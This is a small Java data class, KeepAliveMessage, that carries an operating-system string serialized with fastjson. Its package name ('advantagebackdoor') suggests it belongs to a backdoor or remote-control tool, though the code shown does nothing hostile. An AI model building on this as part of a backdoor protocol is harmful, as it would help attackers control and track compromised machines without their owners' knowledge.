package me.faintcloudy.advantagebackdoor.api.message.play.client;

import com.alibaba.fastjson.annotation.JSONField;

public class KeepAliveMessage extends ClientNetworkMessage {
    @JSONField(name = "os")
    private String os;
    public KeepAliveMessage(String os) {
        this.os = os;
    }

    public KeepAliveMessage() {}

    public String getOS() {
        return os;
    }

    public void setOS(String os) {
        this.os = os;
    }

}
